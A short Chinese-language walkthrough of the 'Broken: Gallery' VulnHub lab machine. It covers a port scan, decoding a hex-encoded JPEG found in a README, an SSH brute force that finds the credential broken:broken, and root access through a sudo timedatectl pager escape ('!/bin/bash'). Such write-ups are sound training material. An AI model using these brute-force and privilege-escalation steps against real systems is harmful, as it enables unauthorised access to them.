# Broken: Gallery

2024-6-13 https://www.vulnhub.com/entry/broken-gallery,344/

difficulty: easy

## IP

192.168.10.197

## Scan

Open Port -> 22,80

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 395ebf8a49a313fa0d34b8db265779a7 (RSA)
|   256 20d772be306a2714e1e6c2167a40c852 (ECDSA)
|_  256 84a09a59612ab71edd6eda3b91f9a0c6 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 55K   2019-08-09 01:20  README.md
| 1.1K  2019-08-09 01:21  gallery.html
| 259K  2019-08-09 01:11  img_5terre.jpg
| 114K  2019-08-09 01:11  img_forest.jpg
| 663K  2019-08-09 01:11  img_lights.jpg
| 8.4K  2019-08-09 01:11  img_mountains.jpg
|_
```

方位 80 web 服务，是个目录列表，4 个图片和一个 md 文件，http://192.168.10.197/README.md 其中显示的是十六进制的字符串，看到文件头的头几个字符 FF D8 FF E0 格式内容为 JPEG 文件，先将字符内容保存，然后用工具进行还原成 jpeg 图片

```
xxd -r -p img.txt > img.jpeg
```

内容如下：

```
Hello Bob,
The application is BROKEN ! the whole infrastructure is BROKEN !!
l am leaving for my summer vacation, l hope you get it fix soon ...
Cheers.
avrahamcohen.ac@gmail.com
```

说系统已经破坏，得到了 2 个用户名 bob 和 avrahamcohen

gobuster 目录爆破也没什么信息，只有看看那 4 个图片有没有隐写信息了，结果没有隐写。

试试 ssh 的暴力破解吧，没有其他的攻击面了，先使用用户名和密码是同样的字典，如果学在使用 rockyou 字典进行破解，用户名使用前面得到的 bob 和 avrahamcohen，还有几个图片的命名也比较奇怪，5terre forest lights mountains gallery BROKEN broken 能得到的字符全部加进去(broken 一直在强调)。

最后爆破得到 broken:broken 这个 ssh 凭据，进行登陆。

sudo -l

```
(ALL) NOPASSWD: /usr/bin/timedatectl
(ALL) NOPASSWD: /sbin/reboot
```

timedatectl 可以直接提权：

```
sudo timedatectl list-timezones
!/bin/bash
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu:~# cd /root
```
